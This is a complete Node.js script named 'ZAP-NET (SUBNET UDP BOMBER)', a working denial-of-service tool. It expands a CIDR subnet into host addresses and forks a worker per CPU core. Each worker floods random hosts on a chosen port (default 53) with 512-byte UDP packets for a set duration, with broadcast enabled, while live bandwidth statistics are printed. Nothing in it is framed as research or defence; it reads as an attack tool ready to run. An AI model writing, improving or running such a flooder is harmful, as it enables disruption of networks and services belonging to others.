const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const [subnet, portArg, durationArg] = process.argv.slice(2);
const port = parseInt(portArg) || 53;
const duration = parseInt(durationArg);

if (!subnet || !duration) {
  console.log('Usage: node ZAP-NET.js <CIDR> <port> <duration_in_seconds>');
  process.exit(1);
}

function cidrToIps(cidr) {
  const [ip, bits] = cidr.split('/');
  const maskBits = parseInt(bits);
  const ipParts = ip.split('.').map(Number);
  const ipAsInt = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
  const hosts = 2 ** (32 - maskBits);
  const start = ipAsInt & (~(hosts - 1));
  const end = start + hosts - 2; // exclude broadcast
  const ipList = [];
  for (let i = start + 1; i <= end; i++) {
    ipList.push([
      (i >> 24) & 255,
      (i >> 16) & 255,
      (i >> 8) & 255,
      i & 255
    ].join('.'));
  }
  return ipList;
}

function formatBytes(bytes) {
  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'ZB'];
  let i = 0;
  while (bytes >= 1024 && i < units.length - 1) {
    bytes /= 1024;
    i++;
  }
  return `${bytes.toFixed(2)} ${units[i]}`;
}

const targets = cidrToIps(subnet);
const cpuCount = os.cpus().length;
const endTime = Date.now() + duration * 1000;
const payloadSize = 512;
const payload = Buffer.alloc(payloadSize, 'Z');

if (cluster.isMaster) {
  console.clear();
  console.log(`ZAP-NET (SUBNET UDP BOMBER)`);
  console.log(`-----------------------------------`);
  console.log(`Target Subnet: ${subnet}`);
  console.log(`Port: ${port}`);
  console.log(`Duration: ${duration}s`);
  console.log(`Total Targets: ${targets.length}`);
  console.log(`CPU Threads: ${cpuCount}`);
  console.log(`-----------------------------------\n`);

  let totalPackets = 0;
  let totalBytes = 0;
  let maxBps = 0;

  // Create stats holder per worker
  const stats = Array(cpuCount).fill().map(() => ({ sent: 0, bytes: 0, bps: 0 }));

  // Fork workers
  for (let i = 0; i < cpuCount; i++) cluster.fork();

  // Listen for stats messages from workers
  Object.values(cluster.workers).forEach((worker, idx) => {
    worker.on('message', (msg) => {
      if (msg.type === 'stats') stats[idx] = msg;
    });
  });

  // Log aggregated stats every 2 seconds
  setInterval(() => {
    const sent = stats.reduce((acc, cur) => acc + cur.sent, 0);
    const bytes = stats.reduce((acc, cur) => acc + cur.bytes, 0);
    const bps = stats.reduce((acc, cur) => acc + cur.bps, 0);
    totalPackets += sent;
    totalBytes += bytes;
    if (bps > maxBps) maxBps = bps;

    console.clear();
    console.log(`ZAP-NET (SUBNET UDP BOMBER)`);
    console.log(`-----------------------------------`);
    console.log(`Target Subnet: ${subnet}`);
    console.log(`Total IPs: ${targets.length}`);
    console.log(`Packets Sent: ${totalPackets.toLocaleString()}`);
    console.log(`Bandwidth Sent: ${formatBytes(totalBytes)}`);
    console.log(`Current BPS: ${formatBytes(bps)}/s`);
    console.log(`Max BPS: ${formatBytes(maxBps)}/s`);
    console.log(`-----------------------------------\n`);
  }, 2000);

  setTimeout(() => {
    console.log('Attack finished.');
    Object.values(cluster.workers).forEach(w => w.kill());
    process.exit(0);
  }, duration * 1000);

} else {
  const socket = dgram.createSocket('udp4');

  // Optional: bind socket for some platforms (can improve reliability)
  socket.bind(() => {
    socket.setBroadcast(true); // enable if needed
  });

  let sent = 0;
  let bytesSent = 0;
  let bps = 0;

  function sendLoop() {
    if (Date.now() > endTime) return;

    for (let i = 0; i < 300; i++) {
      const target = targets[Math.floor(Math.random() * targets.length)];

      socket.send(payload, port, target, (err) => {
        if (!err) {
          sent++;
          bytesSent += payloadSize;
          bps += payloadSize;
        }
      });
    }

    setImmediate(sendLoop);
  }

  setInterval(() => {
    process.send({ type: 'stats', sent, bytes: bytesSent, bps });
    sent = 0;
    bytesSent = 0;
    bps = 0;
  }, 1000);

  sendLoop();
}
